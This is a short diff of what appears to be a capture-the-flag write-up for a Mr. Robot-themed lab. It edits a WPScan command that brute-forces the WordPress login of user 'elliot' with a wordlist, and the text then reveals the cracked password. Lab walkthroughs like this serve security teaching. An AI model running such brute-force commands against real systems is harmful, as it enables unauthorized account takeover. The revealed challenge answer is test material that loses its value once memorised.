@@ -91,7 +91,7 @@ Next, using the wordlist fsociety.dic, let's fire up WPScan to bruteforce the pa
 You may want to clean up the wordlist first and get rid of duplicates for time's sake.
 sort -u fsocity.dic > fsocity2.dic 
 
-wpscan --url http://[machine IP]/wp-login -U elliot -P /path/to//fsocity2.dic -v -t 50
+wpscan --url http://[machine IP]/wp-login -U elliot -P /path/to/fsocity2.dic -t 50
 
 After some time, we discover the password is "ER28-0652".
 
